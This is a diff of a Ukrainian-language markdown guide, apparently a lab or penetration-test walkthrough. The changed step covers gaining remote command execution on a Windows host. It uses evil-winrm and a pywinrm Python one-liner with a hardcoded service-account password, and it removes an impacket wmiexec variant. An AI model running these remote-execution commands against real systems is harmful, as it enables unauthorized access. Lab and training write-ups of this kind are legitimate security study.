@@ -180,9 +180,13 @@ sudo apt install -y libreadline-dev ruby-dev ruby-full && sudo gem install evil-
 evil-winrm -i 10.10.50.150 -u svc_deploy -p 'Deploy@2024!Drone'
 ```
 
-Якщо evil-winrm не знайдено — через Python wmiexec:
+Якщо evil-winrm не знайдено — встанови pywinrm і підключайся через WinRM:
 ```
-python3 /usr/share/doc/python3-impacket/examples/wmiexec.py svc_deploy:'Deploy@2024!Drone'@10.10.50.150
+sudo pip3 install pywinrm
+```
+
+```
+python3 -c "import winrm; s=winrm.Session('http://10.10.50.150:5985/wsman',auth=('svc_deploy','Deploy@2024!Drone')); r=s.run_cmd('whoami'); print(r.std_out.decode())"
 ```
 
 АБО через impacket (якщо evil-winrm не встановився):
